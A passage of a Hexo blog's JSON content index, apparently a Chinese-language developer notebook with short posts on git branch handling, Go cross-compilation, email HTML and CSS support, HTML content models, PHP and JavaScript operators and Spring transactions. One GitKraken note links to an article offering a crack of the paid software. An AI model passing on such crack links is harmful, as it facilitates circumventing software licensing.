class=\"line\">enter</span><br><span class=\"line\"></span><br><span class=\"line\">    gsettings get org.gnome.settings-daemon.plugins.power sleep-inactive-ac-type</span><br><span class=\"line\"></span><br><span class=\"line\">enter</span><br><span class=\"line\"></span><br><span class=\"line\">it should return &apos;nothing&apos;</span><br></pre></td></tr></table></figure>\n<p>最後使用真的有效!!!</p>\n<h2 id=\"安裝-elementaryOS-0-5-小記\"><a href=\"#安裝-elementaryOS-0-5-小記\" class=\"headerlink\" title=\"安裝 elementaryOS 0.5 小記\"></a>安裝 elementaryOS 0.5 小記</h2><ul>\n<li>安裝 zplug 要裝 git 跟</li>\n<li>安裝 hack font 可以使用<code>sudo apt-get install fonts-hack</code></li>\n<li>picture-in-picture 使用方法是<code>win+f</code><a href=\"https://www.youtube.com/watch?v=6FbQzF6h8DA\" target=\"_blank\" rel=\"noopener\">Picture to Picture Mode in elementary OS 5.0 Juno - YouTube</a><br>很羨慕嗎?其實 Chrome 內建這個功能<br>Windows 也可以用<br>只可惜沒有快捷鍵可以做隱藏<br>偶爾使用會遇到 bug，但目前無傷大雅</li>\n</ul>\n<p><a href=\"https://dingmingxin.github.io/blog/2016/05/05/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E4%B8%83%E7%A7%8D%E6%AD%A6%E5%99%A8%E4%B9%8Bzsh/#org2976e1f\" target=\"_blank\" rel=\"noopener\">程序员的七种武器之 Zsh - 从 Hello World 开始</a></p>\n"},{"title":"Git cherry-pick, revert 合併分支的方法","url":"/blog/2019/08/21/Git-cherry-pick-revert-%E5%90%88%E4%BD%B5%E5%88%86%E6%94%AF%E7%9A%84%E6%96%B9%E6%B3%95/","content":"<p>最近想到 revert , cherry-pick 分支好像不能做<br>但只細看一下錯誤訊息<br>好像能使用</p>\n<a id=\"more\"></a>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">git revert -m 1 merge_commit_id</span><br></pre></td></tr></table></figure>\n<p><code>-m</code> 這個就是用在 (複製/退回)branch 用的<br>1 怎麼來的?</p>\n<blockquote>\n<p>如上面的例子中，從 git show 命令的結果中可以看到，merge commit 的 parent 分別為 ba25a9d 和 1c7036f，其中 ba25a9d 代表 master 分支（從圖中可以看出），1c7036f 代表 will-be-revert 分支。需要注意的是 -m 選項接收的參數是一個數字，數字取值為 1 和 2，也就是 Merge 行裡面列出來的第一個還是第二個。<br>我們要 revert will-be-revert 分支上的內容，即 保留主分支，應該設置主分支為主線，操作如下：<br>➜ git revert -m 1 bd86846<br><a href=\"https://blog.csdn.net/guyue35/article/details/82703065\" target=\"_blank\" rel=\"noopener\">Git 之 revert (撤銷commit或merge) - 我是guyue，guyue就是我O(∩_∩)O - CSDN博客</a></p>\n</blockquote>\n<p>這邊 git show 指令可以看到兩個 merge commit_id<br>通常有兩個， 1 ,2 照順序<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">➜  git show bd86846</span><br><span class=\"line\">commit bd868465569400a6b9408050643e5949e8f2b8f5</span><br><span class=\"line\">Merge: ba25a9d 1c7036f</span><br></pre></td></tr></table></figure></p>\n<p>這邊我有想到一個問題<br>revert branch 要怎麼用回來呢<br>繼續 revert ?  後來我覺得應該要再 merge  commit id 就可以合併</p>\n<p>但是看到這篇 revert commit 再次merge 可能需要注意的事情<br><a href=\"https://segmentfault.com/a/1190000012897697\" target=\"_blank\" rel=\"noopener\">Git 之 revert - 活到老学到老 - SegmentFault 思否</a> <a href=\"/blog/2019/08/21/Git-cherry-pick-revert-合併分支的方法/web1.png\" title=\"備份圖\">備份圖</a><br>這篇值得看</p>\n<p>相關連結:</p>\n<ul>\n<li><a href=\"https://segmentfault.com/q/1010000000140446\" target=\"_blank\" rel=\"noopener\">Git怎样撤销一次分支的合并Merge - SegmentFault 思否</a></li>\n<li><a href=\"https://www.cnblogs.com/520yang/articles/6732687.html\" target=\"_blank\" rel=\"noopener\">git revert merge 的commit - 杨博客 - 博客园</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000012897697\" target=\"_blank\" rel=\"noopener\">Git 之 revert - 活到老学到老 - SegmentFault 思否</a></li>\n<li><a href=\"https://segmentfault.com/q/1010000010185984\" target=\"_blank\" rel=\"noopener\">git cherry-pick -m 例子 - SegmentFault 思否</a></li>\n</ul>\n","categories":["Git"],"tags":["git"]},{"title":"Email 支援 HTML 和 CSS 查詢方法","url":"/blog/2020/04/02/Email-%E6%94%AF%E6%8F%B4-HTML-%E5%92%8C-CSS-%E6%9F%A5%E8%A9%A2%E6%96%B9%E6%B3%95/","content":"<p>最近接到簡單的任務<br>修改 E-mail 排版<br>就是縮排的問題<br>但由於我對 Outlook 支援性不是很清楚<br>一個一個試感覺不是很方便<br>有找到幾個網址可以查</p>\n<a id=\"more\"></a>\n<h2 id=\"查詢網站\"><a href=\"#查詢網站\" class=\"headerlink\" title=\"查詢網站\"></a>查詢網站</h2><h3 id=\"HTML\"><a href=\"#HTML\" class=\"headerlink\" title=\"HTML\"></a>HTML</h3><ul>\n<li><a href=\"https://www.outlook-apps.com/html-ignored-by-outlook/\" target=\"_blank\" rel=\"noopener\">Email HTML tags &amp; attributes ignored by Outlook</a></li>\n<li><a href=\"https://www.caniemail.com/\" target=\"_blank\" rel=\"noopener\">Can I email… Support tables for HTML and CSS in emails</a></li>\n</ul>\n<h3 id=\"CSS\"><a href=\"#CSS\" class=\"headerlink\" title=\"CSS\"></a>CSS</h3><ul>\n<li><a href=\"https://www.campaignmonitor.com/css/text-fonts/svg/\" target=\"_blank\" rel=\"noopener\">CSS Support Guide for Email Clients [+Checklist] | Campaign Monitor</a></li>\n<li><a href=\"https://templates.mailchimp.com/resources/email-client-css-support/\" target=\"_blank\" rel=\"noopener\">Email Client CSS Support | Email Design Reference</a></li>\n</ul>\n<h3 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h3><p>神奇的樣版引擎套 email 的 html + css<br><a href=\"https://mjml.io/\" target=\"_blank\" rel=\"noopener\">MJML - The Responsive Email Framework</a></p>\n<h2 id=\"處理空白問題\"><a href=\"#處理空白問題\" class=\"headerlink\" title=\"處理空白問題\"></a>處理空白問題</h2><p>不知道再存文字寄送的時候，Outlook 收信時候不會轉空白字元<br>我在程式外面加 pre html tag就能看到縮排</p>\n<p>另外一種方式全部轉成 HTML</p>\n<p><a href=\"https://75.team/post/considerations-for-styling-the-%3C-pre-%3E-tag.html\" target=\"_blank\" rel=\"noopener\">【译】使用 <pre> 标签样式的注意事项 - 奇舞团博客</pre></a><br><a href=\"https://stackoverflow.com/questions/11429772/html-blank-spaces-in-email\" target=\"_blank\" rel=\"noopener\">vb6 - HTML blank spaces in email - Stack Overflow</a></p>\n<p>改變 ol li 寫法<br><a href=\"https://stackoverflow.com/questions/4098195/can-ordered-list-produce-result-that-looks-like-1-1-1-2-1-3-instead-of-just-1\" target=\"_blank\" rel=\"noopener\">html - Can ordered list produce result that looks like 1.1, 1.2, 1.3 (instead of just 1, 2, 3, …) with css? - Stack Overflow</a></p>\n","categories":["HTML"],"tags":["css","email","html"]},{"title":"GO編譯程式紀錄","url":"/blog/2018/09/01/GO%E7%B7%A8%E8%AD%AF%E7%A8%8B%E5%BC%8F%E7%B4%80%E9%8C%84/","content":"<p>最近玩golang最喜歡它編譯可以直接跨平台執行<br>而且看了一下<br>真的很簡單，只需要一行<code>go build</code><br>但真的是這樣的嗎?<br>(不然也不會有這一篇了XD)</p>\n<a id=\"more\"></a>\n<p>golang編譯真的很簡單<br>只需要<code>go build main.go</code>即可以編譯<code>main.go</code><br>但是<code>go build</code>是整個目錄都會進行編譯<br>編譯出來的程式正常<code>本機</code>可以執行</p>\n<p><strong>為什麼要框住本機呢</strong></p>\n<p>因為這就是我踩雷的地方<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Mac 下编译 Linux 和 Windows 64位可执行程序</span><br><span class=\"line\">CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</span><br><span class=\"line\">CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build main.go</span><br><span class=\"line\"></span><br><span class=\"line\">Linux 下编译 Mac 和 Windows 64位可执行程序</span><br><span class=\"line\">CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build main.go</span><br><span class=\"line\">CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build main.go</span><br><span class=\"line\"></span><br><span class=\"line\">Windows 下编译 Mac 和 Linux 64位可执行程序</span><br><span class=\"line\">SET CGO_ENABLED=0</span><br><span class=\"line\">SET GOOS=darwin</span><br><span class=\"line\">SET GOARCH=amd64</span><br><span class=\"line\">go build main.go</span><br><span class=\"line\"></span><br><span class=\"line\">SET CGO_ENABLED=0</span><br><span class=\"line\">SET GOOS=linux</span><br><span class=\"line\">SET GOARCH=amd64</span><br><span class=\"line\">go build main.go</span><br></pre></td></tr></table></figure></p>\n<p>參考來源:<a href=\"https://blog.csdn.net/panshiqu/article/details/53788067\" target=\"_blank\" rel=\"noopener\">Golang 在 Mac、Linux、Windows 下如何交叉编译 - CSDN博客</a><br>假如你是在window用git-bash話，前面變數可以加<code>export</code><br>當然後面的<code>main.go</code>可以不用填</p>\n<p>正常有<code>go get</code>套件編譯會沒有問題</p>\n<p>環境變數設定完，可以<code>go env</code>查看GO環境變數設定值</p>\n<p>但重點來了</p>\n<h2 id=\"編譯後別台電腦不能執行\"><a href=\"#編譯後別台電腦不能執行\" class=\"headerlink\" title=\"編譯後別台電腦不能執行\"></a>編譯後別台電腦不能執行</h2><p>奇怪我把程式丟到Linux竟然不能執行  (說好的編譯可以跑的  囧)<br>但發現執行錯誤訊息<br>竟然有出現我在Win7路徑<br>當下沒有留意到是抓不到Package問題<br>好像有甚麼<strong>address</strong>關鍵字錯誤<br>因為同事也有在玩<br>他說是抓不到套件關係</p>\n<p>後來有爬到一個指令<br>在程式目錄執行<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">go build -a -v</span><br></pre></td></tr></table></figure></p>\n<p>這樣就很神奇可以跑<br>不過我在win7編譯Linux程式，在Linux還是不能跑<br>Linux編譯Win7程式，在Win7正常執行<br>但是在Win10編譯Linux程式，在Linux正持行<br>反之也可以</p>\n<p>不知道Win7編譯GO怎麼了….</p>\n<p>其實這篇重點只有<code>go build -v -a</code><br>但網路上看到的文章真的不多<br>不知道為什麼…(有可能我方法不正確)</p>\n<h2 id=\"gitea編譯紀錄\"><a href=\"#gitea編譯紀錄\" class=\"headerlink\" title=\"gitea編譯紀錄\"></a>gitea編譯紀錄</h2><p>中間有試著<code>gitea</code>編譯<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">make generate all</span><br></pre></td></tr></table></figure></p>\n<p>不知道這一行我不能執行<br>但輸入<code>make</code>就正常運行<br>輸入<code>go build -v -a</code>也能跑，(<code>go build</code>好像不能)</p>\n<p>參考來源<br><a href=\"https://segmentfault.com/q/1010000004044176\" target=\"_blank\" rel=\"noopener\">golang - Go语言的三个命令 go build, go install, go get - SegmentFault 思否</a><br><a href=\"http://wiki.jikexueyuan.com/project/go-command-tutorial/0.1.html\" target=\"_blank\" rel=\"noopener\">go build - GO 命令教程 - 极客学院Wiki</a></p>\n","categories":["GO"],"tags":["GO"]},{"title":"Git 查看合併分支並刪除方法","url":"/blog/2019/08/27/Git-%E6%9F%A5%E7%9C%8B%E5%90%88%E4%BD%B5%E5%88%86%E6%94%AF%E4%B8%A6%E5%88%AA%E9%99%A4%E6%96%B9%E6%B3%95/","content":"<p>最近常常看哪些 branch 有做合併動作<br>我都使用<code>gitk --all</code> 看合併<br>但我覺得應該有很方便指令看的方法</p>\n<a id=\"more\"></a>\n<p>官方文件有詳細說明<br><a href=\"https://git-scm.com/book/zh-tw/v1/Git-%E5%88%86%E6%94%AF-%E5%88%86%E6%94%AF%E7%9A%84%E7%AE%A1%E7%90%86\" target=\"_blank\" rel=\"noopener\">Git - 分支的管理</a></p>\n<h2 id=\"git-branch-–merged\"><a href=\"#git-branch-–merged\" class=\"headerlink\" title=\"git branch –merged\"></a>git branch –merged</h2><p>show 出來已經 merged 的分支</p>\n<h2 id=\"git-branch-–no-merged\"><a href=\"#git-branch-–no-merged\" class=\"headerlink\" title=\"git branch –no-merged\"></a>git branch –no-merged</h2><p>以此類推，list出沒合併的分支</p>\n<h2 id=\"其他備註\"><a href=\"#其他備註\" class=\"headerlink\" title=\"其他備註\"></a>其他備註</h2><p>之前有做過<a href=\"https://malagege.github.io/blog/2019/05/09/Git%E5%88%AA%E9%99%A4Rmote-Branch%E6%96%B9%E6%B3%95/\">Git刪除Rmote Branch方法 | 程式狂想筆記</a><br><strong>看來local 端的 git branch 要自己 <code>git branch -d xxx</code></strong><br>沒辦法自動 delete 掉</p>\n<p>git fetch -p or git fetch –all –prune 是清除本地的remote 暫存分支</p>\n<p>相關連結<br><a href=\"https://blog.alantsai.net/posts/2019/04/faq-git-how-to-delete-merged-branches-from-remote-and-local\" target=\"_blank\" rel=\"noopener\">[git]如何快速清理已經合並(merged)的分支(branch) - local及remote @ Alan Tsai 的學習筆記｜An Asp .Net Mvc Web Developer Blog</a><br><a href=\"https://qiita.com/vc7/items/6e06b0306c8a64a23263\" target=\"_blank\" rel=\"noopener\">Git 的 Merge 與 Fast-Forward - Qiita</a><br><a href=\"https://dev.to/lydiahallie/cs-visualized-useful-git-commands-37p1\" target=\"_blank\" rel=\"noopener\">🌳🚀 CS Visualized: Useful Git Commands - DEV Community 👩‍💻👨‍💻</a></p>\n","categories":["Git"],"tags":["git"]},{"title":"GitKraken 使用小記","url":"/blog/2020/06/18/GitKraken-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/","content":"<p>一些使用小記</p>\n<a id=\"more\"></a>\n<ol>\n<li>branch 資料夾命名，可以在 branch 命 <code>feature/fixed_bug</code><br>會產生資料夾</li>\n</ol>\n<ol start=\"2\">\n<li>左邊介面的分支，可做拖拉 branch  到 別的 branch，會產生合併，非常方便</li>\n</ol>\n<p>其他:</p>\n<ul>\n<li><a href=\"https://juejin.im/post/5e686b05f265da57553df06d\" target=\"_blank\" rel=\"noopener\">gitKraken 6.5.0 免收费破解 - 掘金</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/114556763\" target=\"_blank\" rel=\"noopener\">GitKraken：和你的私有仓库说再见吧。我：但是，我拒绝 - 知乎</a></li>\n</ul>\n","categories":["Git"],"tags":["git"]},{"title":"Git刪除Rmote Branch方法","url":"/blog/2019/05/09/Git%E5%88%AA%E9%99%A4Rmote-Branch%E6%96%B9%E6%B3%95/","content":"<p>之前就有類似寫過刪除 remote 分支方法<br>但今天想開出來紀錄<br>有時候刪除 remote 分支<br>但是我發現我本機上面可以看到刪除的分支(<code>git branch -a</code>)<br>要怎麼解決呢?</p>\n<a id=\"more\"></a>\n<h2 id=\"本機刪除\"><a href=\"#本機刪除\" class=\"headerlink\" title=\"本機刪除\"></a>本機刪除</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git branch -d/-D xxx</span><br></pre></td></tr></table></figure>\n<h2 id=\"遠端刪除-但還是會殘留在本機\"><a href=\"#遠端刪除-但還是會殘留在本機\" class=\"headerlink\" title=\"遠端刪除(但還是會殘留在本機)\"></a>遠端刪除(但還是會殘留在本機)</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git push origin :cat</span><br></pre></td></tr></table></figure>\n<p>詳細：<a href=\"https://malagege.github.io/blog/2018/11/26/git%E5%88%AA%E9%99%A4%E9%81%A0%E7%AB%AF-remote-%E5%88%86%E6%94%AF/\">git 刪除遠端(remote)分支和強制 pull 下來分支 | 程式狂想筆記</a></p>\n<h2 id=\"刪除殘留本機-remote\"><a href=\"#刪除殘留本機-remote\" class=\"headerlink\" title=\"刪除殘留本機 remote\"></a>刪除殘留本機 remote</h2><p>有時候就是不小心打指令<br>結果不小心<code>checkout</code>進來，它會新增到我分支<br>等於又要重新刪除分支</p>\n<p><code>git fetch -p</code> or <code>git fetch –all –prune</code>都可以解決</p>\n<p>詳細:<a href=\"https://blog.yowko.com/git-delete-remote-branch/\" target=\"_blank\" rel=\"noopener\">關於 Git 刪除 Remote Branch - Yowko’s Notes</a><br><a href=\"https://codeday.me/bug/20170526/21419.html\" target=\"_blank\" rel=\"noopener\">git 远程修剪,git 修剪,git fetch – prune 等之间的区别是什么 - 代码日志</a></p>\n<p>其他小記:<br>不修改 commit 內容 <code>--no-edit</code><br><a href=\"https://stackoverflow.com/questions/11744081/why-is-git-prompting-me-for-a-post-pull-merge-commit-message\" target=\"_blank\" rel=\"noopener\">Why is git prompting me for a post-pull merge commit message? - Stack Overflow</a></p>\n<p><a href=\"https://stackoverflow.com/questions/22058041/commit-without-setting-user-email-and-user-name\" target=\"_blank\" rel=\"noopener\">git - Commit without setting user.email and user.name - Stack Overflow</a></p>\n<p>顯示 git commit 修程式<br><code>git log --name-only</code><br><a href=\"https://stackoverflow.com/questions/1230084/how-to-have-git-log-show-filenames-like-svn-log-v\" target=\"_blank\" rel=\"noopener\">How to have git log show filenames like svn log -v - Stack Overflow</a></p>\n","categories":["Git"],"tags":["git"]},{"title":"[HTML]<p>(Phrasing元素)放入div或block元素會分割成兩塊","url":"/blog/2018/06/24/HTML-p-Phrasing%E5%85%83%E7%B4%A0-%E6%94%BE%E5%85%A5div%E6%88%96block%E5%85%83%E7%B4%A0%E6%9C%83%E5%88%86%E5%89%B2%E6%88%90%E5%85%A9%E5%A1%8A/","content":"<p>最近剛好網路爬文看到這個</p>\n<p>不過…，我相信不知道這個很容易踩雷<br>就先記錄一下</p>\n<a id=\"more\"></a>\n<blockquote>\n<p>Phrasing<br>所有可以放在p标签内，构成段落内容的元素均属于Phrasing元素。因此，所有Phrasing元素均属于Flow元素。在HTML5标准文档中，关于Phrasing元素的原始定义为：<br>    Phrasing content is the text of the document, as well as elements that mark up that text at the intra-paragraph level. Runs of phrasing content form paragraphs.<br>对于这一定义，个人认为不应当使用“text”这一容易引起误解的词，事实上，一个元素即使不是文本，只要能包含在p标签中成为段落内容的一部分，就可以称之为Phrasing元素。比如：audio、video、img、select、input等元素(经测试，这些元素都可以放置在p标签中)。一个不太精确的类比是：HTML5中的Phrasing元素大致就是HTML4中所定义的inline元素。<br>Phrasing元素内部一般只能包含别的Phrasing元素。</p>\n</blockquote>\n<p>簡單講就是p元素裡面不能隨意插進一些元素</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">Phrasing content defines the text and the mark-up it contains. Runs of phrasing content make up paragraphs.</span><br><span class=\"line\">Elements belonging to this category are <span class=\"tag\">&lt;<span class=\"name\">abbr</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">audio</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">b</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">bdo</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">button</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">canvas</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">cite</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">code</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">command</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">data</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">datalist</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">dfn</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">em</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">embed</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">i</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">iframe</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">img</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">input</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">kbd</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">keygen</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">label</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">mark</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">math</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">meter</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">noscript</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">object</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">output</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">progress</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">q</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">ruby</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">samp</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"xml\">, <span class=\"tag\">&lt;<span class=\"name\">select</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">small</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">strong</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">sub</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">sup</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">svg</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">textarea</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">time</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">var</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">video</span>&gt;</span>, <span class=\"tag\">&lt;<span class=\"name\">wbr</span>&gt;</span> and plain text (not only consisting of white spaces characters).</span></span><br></pre></td></tr></table></figure>\n<p>看開發工具，除了排版變怪了，你會看到開發工具有兩個<code>&lt;p&gt;&lt;/p&gt;</code>，最後一個格式還跑掉</p>\n<img src=\"/blog/2018/06/24/HTML-p-Phrasing元素-放入div或block元素會分割成兩塊/show1.png\" title=\"p範例split\">\n<p><a href=\"https://html.spec.whatwg.org/multipage/grouping-content.html#the-p-element\" target=\"_blank\" rel=\"noopener\">HTML Standard</a><br><a href=\"http://blog.shaochuancs.com/w3c-html5-content-model/\" target=\"_blank\" rel=\"noopener\">W3C HTML5标准阅读笔记 – 元素分类与内容模型(Content Model)</a></p>\n","categories":["HTML"],"tags":["HTML","p","phrasing"]},{"title":"HTML5控制audio初體驗","url":"/blog/2018/05/01/HTML5%E6%8E%A7%E5%88%B6audio%E5%88%9D%E9%AB%94%E9%A9%97/","content":"<p>平常沒什麼在用audio<br>最近專案有用到，就簡單來記錄一下</p>\n<a id=\"more\"></a>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">audio</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>使用時候，不會顯示出頁面上<br>預設也不會播音樂<br><code>autoplay</code>會自動播放<br><code>controls</code>會顯示出來頁面<br><code>loop</code>循環播放<br><code>preload</code>有三種載入狀態</p>\n<ul>\n<li><code>auto</code>頁面載入時侯會把檔案載入進來</li>\n<li><code>metadata</code> 頁面載入時侯會把檔案載入進來</li>\n<li><code>none</code>頁面載入時候不會把資料載入進來</li>\n</ul>\n<p><code>muted</code>靜音</p>\n<p>還有很常看到使用<code>socure</code>搭配，假如多個音源檔(例如:ogg和mp3)<br>可以使用<code>socure</code><br>不過看<a href=\"https://www.w3schools.com/tags/tag_source.asp\" target=\"_blank\" rel=\"noopener\">HTML source Tag</a><br>竟然還可以用在picture上面<br>相信做rwd可能會比較方便<br>不用寫jsXD<br>有空來筆記</p>\n","categories":["HTML"],"tags":["HTML","audio"]},{"title":"'Hello World' || '' 在PHP與 JavaScript程式Logical Operators差異","url":"/blog/2018/08/18/Hello-World-%E5%9C%A8PHP%E8%88%87-JavaScript%E7%A8%8B%E5%BC%8FLogical-Operators%E5%B7%AE%E7%95%B0/","content":"<p>PHP和JavaScript同樣兩個都是軟型態<br>大同小異，但做這個Logical Operators結果不一樣</p>\n<p>最近不小心在PHP寫出一個bug<br>被同事抓到了<br>同一個雷不要在踩<br><a id=\"more\"></a></p>\n<h2 id=\"PHP\"><a href=\"#PHP\" class=\"headerlink\" title=\"PHP\"></a>PHP</h2><p>PHP一定回傳boolean<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$a = <span class=\"number\">0</span> || <span class=\"string\">'avacado'</span>;</span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"A: $a\\n\"</span>;</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>will print:<br>A: 1</p>\n</blockquote>\n<img src=\"/blog/2018/08/18/Hello-World-在PHP與-JavaScript程式Logical-Operators差異/php_lo.png\" title=\"PHP Logical Operators\">\n<p><a href=\"http://php.net/manual/en/language.operators.logical.php#77411\" target=\"_blank\" rel=\"noopener\">PHP: Logical Operators - Manual</a></p>\n<h2 id=\"JavaScript\"><a href=\"#JavaScript\" class=\"headerlink\" title=\"JavaScript\"></a>JavaScript</h2><p><code>&#39;ex1&#39;||&#39;ex2&#39;</code>true傳回’ex1’ false 傳噡’ex2’</p>\n<p>不過剛看了下面MDN寫的內容<br><img src=\"/blog/2018/08/18/Hello-World-在PHP與-JavaScript程式Logical-Operators差異/js_lo.png\" title=\"JavaScript Logical Operators\"><br><a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Logical_Operators#Description\" target=\"_blank\" rel=\"noopener\">Logical Operators - JavaScript | MDN</a></p>\n<p>還有<code>&#39;ex1&#39;&amp;&amp; &#39;ex2&#39;</code><br>true傳回ex2<br>false傳回ex1</p>\n<p>大部份比較常在JS看到 <code>||</code>，但是<code>&amp;&amp;</code>真的比較少看到</p>\n","categories":["PHP"],"tags":["javascript","PHP","Logical operators"]},{"title":"Hexo設定blog子資料夾網址","url":"/blog/2018/04/08/Hexo%E8%A8%AD%E5%AE%9Ablog%E5%AD%90%E8%B3%87%E6%96%99%E5%A4%BE%E7%B6%B2%E5%9D%80/","content":"<p>設定筆記紀錄</p>\n<a id=\"more\"></a>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># URL</span></span><br><span class=\"line\"><span class=\"comment\">## If your site is put in a subdirectory, set url as 'http://yoursite.com/child' and root as '/child/'</span></span><br><span class=\"line\"><span class=\"attr\">url:</span> <span class=\"string\">.</span></span><br><span class=\"line\"><span class=\"attr\">root:</span> <span class=\"string\">/blog/</span></span><br><span class=\"line\"><span class=\"attr\">permalink:</span> <span class=\"string\">:year/:month/:day/:title/</span></span><br><span class=\"line\"><span class=\"attr\">permalink_defaults:</span></span><br></pre></td></tr></table></figure>","categories":["寫程式一些事"],"tags":["hexo","url"]},{"title":"Hey 壓力測試工具","url":"/blog/2019/08/30/Hey-%E5%A3%93%E5%8A%9B%E6%B8%AC%E8%A9%A6%E5%B7%A5%E5%85%B7/","content":"<p>還在整理中…</p>\n<a id=\"more\"></a>\n<p>簡單說一下 QPS = request / sec</p>\n<p>測試高併發的時候可以使用這個</p>\n<p><a href=\"https://boxcore.github.io/2017/11/22/sa/talk-about-tps-and-qps.html\" target=\"_blank\" rel=\"noopener\">谈谈并发的一些基础概念 | BoxCore</a></p>\n<p><a href=\"http://www.v218.com/a126\" target=\"_blank\" rel=\"noopener\">hey壓力測試工具介紹 - V218筆記</a></p>\n<p><a href=\"https://boxcore.github.io/2017/11/22/sa/talk-about-tps-and-qps.html\" target=\"_blank\" rel=\"noopener\">谈谈并发的一些基础概念 | BoxCore</a></p>\n<p><a href=\"https://www.magentonotes.com/what-is-qps.html\" target=\"_blank\" rel=\"noopener\">QPS、PV和需要部署机器数量计算公式 | Web开发笔记</a></p>\n","categories":["實用工具"],"tags":["hey","jmeter"]},{"title":"Spring 交易事務失效","url":"/blog/2020/08/27/Hibernate-%E4%BA%A4%E6%98%93%E4%BA%8B%E5%8B%99%E5%A4%B1%E6%95%88/","content":"<p>最近接觸 Spring 專案搭配<del>使用 Hibernate</del> 後來想到應該是Spring-Tx<br>但是使用上常常處理事務跟我想要的結果不一樣<br>這個沒有研究清楚，常常事務那邊會一直卡住<br>最近剛好查到資料，這邊整理一下吧</p>\n<a id=\"more\"></a>\n<ul>\n<li><a href=\"https://www.cnblogs.com/daimzh/p/13532990.html\" target=\"_blank\" rel=\"noopener\">一個@Transaction哪裡來這麼多坑？ - 程序員DMZ - 博客園</a> <a href=\"/blog/2020/08/27/Hibernate-交易事務失效/web1.png\" title=\"備份圖\">備份圖</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/38208248\" target=\"_blank\" rel=\"noopener\">玩转Spring —— 消失的事务 - 知乎</a> <a href=\"/blog/2020/08/27/Hibernate-交易事務失效/web2.png\" title=\"備份圖\">備份圖</a></li>\n</ul>\n<h2 id=\"主要原因\"><a href=\"#主要原因\" class=\"headerlink\" title=\"主要原因\"></a>主要原因</h2><p>最近有時候發現交易沒有生效<br>最近翻到這篇文章<br>原來需要注意這個部分</p>\n<p>這兩篇寫得很棒<br>簡單總結一下</p>\n<img src=\"/blog/2020/08/27/Hibernate-交易事務失效/a.jpg\" title=\"Transactional\">\n<p>上圖簡單說明，使用 Transactional 會用代理模式開啟 DB 事務<br>但為什麼第一層 Transactional 方法呼叫同個類別(Class)的方法會沒有新開事務呢<br>會看到代理(Proxy)類別呼叫第二層是呼叫到原本的(不是 Proxy)類別的 